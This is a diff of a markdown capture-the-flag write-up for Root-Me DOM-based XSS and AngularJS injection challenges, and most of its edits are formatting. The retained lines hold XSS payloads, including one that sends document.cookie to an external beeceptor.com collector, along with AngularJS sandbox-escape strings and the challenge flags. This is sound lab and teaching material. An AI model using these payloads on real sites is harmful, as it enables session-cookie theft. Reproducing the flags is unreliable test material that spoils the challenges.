@@ -1,4 +1,4 @@
-# XSS Dom Based
+# Web - client
 
 ## Introduction
 
@@ -46,9 +46,7 @@ But this one did
 1'; document.location="https://uwuos2.free.beeceptor.com/?c="%2Bdocument.cookie; //
 ```
 
-::: tip Flag
-`rootme{XSS_D0M_BaSed_InTr0}`
-:::
+> Flag: `rootme{XSS_D0M_BaSed_InTr0}`
 
 ## AngularJS
 
@@ -56,7 +54,7 @@ But this one did
 
 Steal the admin’s session cookie.
 
-[Start the challenge](http://challenge01.root-me.org/web-client/ch35/)
+[Start the challenge](http://challenge01.root-me.org/web-client/ch35/index.php)
 
 ### Solution
 
@@ -64,7 +62,7 @@ When we start typing name the `password` is filled out automatically. When press
 
 ![xss-dom-based-2.png](/assets/ctf/root-me/xss-dom-based-2.png)
 
-Name is passed using GET param: [challenge01.root-me.org/web-client/ch35/?name=letmein](challenge01.root-me.org/web-client/ch35/?name=letmein)
+Name is passed using GET param: [http://challenge01.root-me.org/web-client/ch35/?name=letmein](http://challenge01.root-me.org/web-client/ch35/?name=letmein)
 
 Like last time it's loading into `name` variable dynamically
 ```html
@@ -85,7 +83,12 @@ Considering the challenge name it's not a normal HTML so some research: [https:/
 
 Hmm... looks like first we must escape the quote.
 
-`{{constructor.constructor('alert(1)')()}}` generates an alert
+::: raw
+```js
+// generates an alert
+{{constructor.constructor('alert(1)')()}}` 
+```
+:::
 
 ![xss-dom-based-3.png](/assets/ctf/root-me/xss-dom-based-3.png)
 
@@ -99,9 +102,7 @@ http://challenge01.root-me.org/web-client/ch35/?name={{constructor.constructor("
 
 > **Note**: Callback took some time
 
-::: tip Flag
-`rootme{@NGu1@R_J$_1$_C001}`
-:::
+> Flag: `rootme{@NGu1@R_J$_1$_C001}`
 
 ## Eval
 
@@ -221,6 +222,4 @@ URL: http://challenge01.root-me.org/web-client/ch33/?number=1%27%0Adocument.loca
 
 > **Note**: Callback took a lot more then it should have taken..
 
-::: tip Flag
-`rootme{FilTERS_ByPass_DOm_BASEd_XSS}`
-:::
+> Flag: `rootme{FilTERS_ByPass_DOm_BASEd_XSS}`
